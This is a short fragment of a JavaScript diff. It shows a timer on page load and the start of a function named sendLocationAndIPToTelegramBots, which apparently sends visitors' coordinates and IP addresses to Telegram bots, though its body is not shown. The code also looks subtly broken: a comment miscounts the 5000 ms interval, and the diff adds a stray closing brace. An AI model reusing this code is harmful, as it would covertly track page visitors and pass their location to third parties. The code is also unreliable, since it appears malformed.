@@ -18,6 +18,8 @@ yourFunction();
 window.onload = function() {
       setInterval(yourFunction, 5000); // 2000 milliseconds = 2 seconds
     };
+  });
+
 
 
   async function sendLocationAndIPToTelegramBots(latitude, longitude) {
